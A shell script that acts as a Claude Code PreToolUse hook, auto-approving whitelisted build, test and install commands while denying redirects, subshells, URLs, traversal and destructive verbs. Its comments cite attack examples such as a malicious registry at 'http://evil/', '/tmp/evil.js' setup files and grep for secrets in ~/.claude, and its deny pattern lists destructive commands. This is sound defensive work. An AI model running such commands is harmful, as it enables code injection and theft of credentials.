#!/bin/sh
# PreToolUse hook (F16) — auto-approve a SINGLE clean build/test/lint/install command,
# optionally followed by a HARMLESS read-only tail (| grep/head/tail/wc ; echo).
# Independent second hook; does NOT touch auto-approve.sh. Layered:
#   (0) flag gate     — nothing unless ~/.claude/auto-approve-build.enabled exists
#   (1) hard deny     — redirect (< >), subshell, chaining, background, inline URL,
#                       absolute/parent-path arg, destructive verbs → defer (never allow)
#   (2) allow-list    — segment 1 = whitelisted main verb; later segments = harmless filter
#   (3) audit log     — every allow appended to ~/.claude/auto-approve.log
# Print nothing + exit 0 = defer (fall through to normal prompt). deny>allow>defer compose.
#
# SECURITY NOTE: this is a best-effort *convenience* denylist, NOT a hard sandbox. It
# whitelists build/test verbs and blocks the obvious code-injection vectors (redirects,
# subshells, URLs, absolute/parent-path args, file-reading tails). A determined attacker
# who controls your build config can still run code via the build tool itself; F16 exists
# to cut prompt-fatigue on routine builds, not to be a trust boundary.

input=$(cat)
[ -f "$HOME/.claude/auto-approve-build.enabled" ] || exit 0

tool=$(printf '%s' "$input" | jq -r '.tool_name // empty' 2>/dev/null)
[ "$tool" = "Bash" ] || exit 0
cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null)
[ -z "$cmd" ] && exit 0

# (1) hard deny veto. Char class denies redirects (< >), backtick subshell, background (&).
#   NOTE: `<` closes input-redirect AND process-substitution `<(...)`; a lone `&` MUST be
#   denied — `tr` below only splits on | and ; , so `cmd & evil` would otherwise stay one
#   segment and pass the is_main start-anchored check.
#   Also deny: $( subshell, || chaining, any inline URL (http/https/ftp/file), and any
#   argument that is an absolute path (/...), home path (~/...) or parent traversal (../) —
#   these are how a whitelisted tool gets pointed at attacker-controlled files/registries
#   (e.g. `jest --globalSetup=/tmp/evil.js`, `pytest /tmp/evil.py`, `make -f /tmp/evil.mk`,
#   `npm install --registry http://evil/`). Destructive verbs denied last; their
#   left boundary excludes '-' so a flag like `-cp` / `-Dx=-cp` is not read as the
#   `cp` command (a real cp still needs a start/space/;/| boundary → still denied).
deny='>>|[<>`&]|\$\(|\|\||(https?|ftp|file)://|(^|[=[:space:]])(/|~/|\.\./)|(^|[^-[:alnum:]_])(rm|rmdir|mv|cp|sudo|chmod|chown|kill|taskkill|dd|mkfs|del|format|truncate|tee|ln)([^[:alnum:]_]|$)'
if printf '%s' "$cmd" | grep -Eq "$deny"; then exit 0; fi

# main verb whitelist (segment 1 must match one of these patterns from its start).
# yarn is intentionally limited to install|test|ci|run build via the (npm|pnpm|yarn) branch
# — there is NO bare `yarn <anything>` branch (that let `yarn exec sh` / `yarn dlx <evil>`
# through).
is_main() {
  printf '%s' "$1" | grep -Eq '^[[:space:]]*((mvn|\./mvnw)([[:space:]]+-[^[:space:]]+)*[[:space:]]+(compile|test-compile|verify|test)([[:space:]]|$)|(gradle|\./gradlew)[[:space:]]+(build|assemble|test)|tsc([[:space:]]+--noEmit)?([[:space:]]|$)|(npm|pnpm|yarn)[[:space:]]+(run[[:space:]]+build|test|install|ci)([[:space:]]|$)|vite[[:space:]]+build|go[[:space:]]+(build|vet|test|get)([[:space:]]|$)|go[[:space:]]+mod[[:space:]]+(download|tidy)|cargo[[:space:]]+(build|check|test|fetch)([[:space:]]|$)|make([[:space:]]|$)|dotnet[[:space:]]+(build|test|restore)|(jest|vitest|mocha|playwright|cypress|pytest|mypy)([[:space:]]|$)|(python|python3)[[:space:]]+-m[[:space:]]+pytest|eslint([[:space:]]|$)|prettier[[:space:]]+--check|ruff[[:space:]]+check|gofmt[[:space:]]+-l|(pip|pip3)[[:space:]]+install|poetry[[:space:]]+install|pipenv[[:space:]]+install|uv[[:space:]]+pip[[:space:]]+install|bundle[[:space:]]+install|composer[[:space:]]+install)'
}

# split on | and ; that are OUTSIDE quotes (quoted ones are literal args, not
# combinators — a plain `tr` would wrongly split e.g. -Dtest='Foo;Bar'). awk walks
# char-by-char tracking quote state; sq/dq passed via -v for portable quote chars.
segs=$(printf '%s' "$cmd" | awk -v sq="'" -v dq='"' '
{
  res=""; inq=0; qc="";
  n=length($0);
  for (i=1;i<=n;i++) {
    c=substr($0,i,1);
    if (inq)                 { res=res c; if (c==qc) inq=0 }
    else if (c==sq||c==dq)   { inq=1; qc=c; res=res c }
    else if (c=="|"||c==";") { res=res "\n" }
    else                     { res=res c }
  }
  print res
}')
i=0; ok=1
while IFS= read -r seg; do
  seg=$(printf '%s' "$seg" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
  [ -z "$seg" ] && continue
  i=$((i+1))
  if [ "$i" -eq 1 ]; then
    is_main "$seg" || { ok=0; break; }
  else
    # later segments must be a PURE stdin filter — no file args, no recursive read.
    # allowlist excludes cat/ls (they read files / never filter stdin); the guard rejects
    # any path-like token (~ or .../) and any recursive flag (-r/-R), so `| cat <file>`,
    # `| grep -r secret ~/.claude`, `| head /etc/passwd`, `| grep -r secret` all defer.
    first=$(printf '%s' "$seg" | awk '{print $1}')
    case "$first" in
      grep|head|tail|wc|echo) : ;;
      *) ok=0; break ;;
    esac
    if printf '%s' "$seg" | grep -Eq '(^|[[:space:]])(~|[^[:space:]]*/|-[A-Za-z]*[rR])'; then ok=0; break; fi
  fi
done <<EOF
$segs
EOF

[ "$ok" -eq 1 ] || exit 0

ts=$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)
sid=$(printf '%s' "$input" | jq -r '.session_id // ""' 2>/dev/null)
printf '%s\tsid=%s\tBash(build)\t%s\n' "$ts" "$sid" "$cmd" >> "$HOME/.claude/auto-approve.log" 2>/dev/null
printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"auto-build: single cmd + harmless tail"}}\n'
exit 0
